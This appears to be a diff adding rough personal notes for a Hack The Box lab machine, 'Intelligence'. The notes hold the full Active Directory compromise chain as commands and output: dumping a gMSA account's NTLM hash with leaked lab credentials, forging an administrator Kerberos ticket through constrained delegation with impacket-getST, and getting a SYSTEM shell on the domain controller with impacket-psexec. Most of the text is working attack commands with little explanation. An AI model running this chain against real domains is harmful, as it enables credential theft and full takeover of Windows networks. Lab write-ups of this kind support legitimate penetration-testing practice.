+impacket-getST -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb -hashes :6bf735e60852b92212d512a4deadcfea -impersonate administrator intelligence/svc_int
+
+KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
+                                                         
+=============================================================================================
+
+SYNTAX IS KEY, the service is very picky. The following worked:
+COMMANDS:
+=============================================================================================
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ sudo service virtualbox-guest-utils stop
+
+sudo ntpdate 10.10.10.248
+
+{"time":"2022-07-01T02:30:14.456055-0400","offset":25201.445882,"precision":0.145874,"host":"10.10.10.248","ip":"10.10.10.248","stratum":1,"leap":"no-leap","adjusted":true}
+CLOCK: time stepped by 25201.445882
+
+
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l dc.intelligence.htb -d intelligence.htb 
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::6bf735e60852b92212d512a4deadcfea
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ impacket-getST -spn WWW/dc.intelligence.htb "intelligence.htb/svc_int$" -hashes ":6bf735e60852b92212d512a4deadcfea" -dc-ip dc.intelligence.htb -impersonate administrator
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in administrator.ccache
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ ls
+administrator.ccache  gMSADumper.py  __init__.py  __pycache__  README.md
+                                                                                              
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ export KRB5CCNAME=administrator.ccache
+
+┌──(kali㉿kali)-[~/htb/windows/intelligence/gMSADumper]
+└─$ impacket-psexec -dc-ip dc.intelligence.htb -k "intelligence.htb/Administrator@dc.intelligence.htb" -no-pass
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on dc.intelligence.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file sXuWjUew.exe
+[*] Opening SVCManager on dc.intelligence.htb.....
+[*] Creating service NYZD on dc.intelligence.htb.....
+[*] Starting service NYZD.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1879]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
+
+COMMANDS:
+=============================================================================================
+=============================================================================================
